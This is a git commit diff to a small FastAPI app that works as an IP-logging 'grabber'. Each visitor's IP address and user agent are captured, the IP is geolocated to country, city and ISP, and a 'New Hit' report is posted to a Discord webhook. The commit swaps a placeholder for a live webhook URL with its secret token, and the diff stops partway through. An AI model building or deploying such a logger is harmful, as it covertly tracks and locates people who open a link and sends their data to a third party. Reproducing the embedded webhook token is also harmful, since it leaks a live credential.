b23db5bb6fcd76df2b2e9f9530f2198050ba9479
peciontop <163685453+peciontop@users.noreply.github.com>
2026-03-28 21:58:51 +0100

    Update main.py

--- api/main.py
+++ api/main.py
@@ -4,79 +4,32 @@ import datetime
 
 app = FastAPI()
 
-WEBHOOK = "TU_WKLEJ_WEBHOOK"
+WEBHOOK = "https://discord.com/api/webhooks/1487544685286260736/NXWg6tI2WDWHryyIKngEvZLqh401dZmWHPF0ALZFirU1d3GMviuakEFGgd4wH1GbEJ3_"
 
 def get_location(ip):
     try:
         r = requests.get(f"http://ip-api.com/json/{ip}").json()
-        return {
-            "country": r.get("country"),
-            "city": r.get("city"),
-            "region": r.get("regionName"),
-            "isp": r.get("isp"),
-            "lat": r.get("lat"),
-            "lon": r.get("lon")
-        }
+        return r
     except:
         return {}
 
 @app.get("/")
 async def logger(request: Request):
-
     ip = request.headers.get("x-forwarded-for", request.client.host)
     user_agent = request.headers.get("user-agent")
-    referer = request.headers.get("referer")
 
     location = get_location(ip)
 
     data = {
-        "content": None,
-        "embeds": [
-            {
-                "title": "New Hit",
-                "color": 5814783,
-                "fields": [
-                    {
-                        "name": "IP",
-                        "value": str(ip),
-                        "inline": True
-                    },
-                    {
-                        "name": "Country",
-                        "value": str(location.get("country")),
-                        "inline": True
-                    },
-                    {
-                        "name": "City",
-                        "value": str(location.get("city")),
-                        "inline": True
-                    },
-                    {
-                        "name": "Region",
-                        "value": str(location.get("region")),
-                        "inline": True
-                    },
-                    {
-                        "name": "ISP",
-                        "value": str(location.get("isp")),
-                        "inline": False
-                    },
-                    {
-                        "name": "User Agent",
-                        "value": str(user_agent)[:1000],
-                        "inline": False
-                    },
-                    {
-                        "name": "Referer",
-                        "value": str(referer),
-                        "inline": False
-                    }
-                ],
-                "footer": {
-                    "text": str(datetime.datetime.now())
-                }
-            }
-        ]
+        "content": f"""
+New Hit
+
+IP: {ip}
+Country: {location.get("country")}
+City: {location.get("city")}
+ISP: {location.get("isp")}
+UA: {user_agent}
+"""
     }
 
     try:
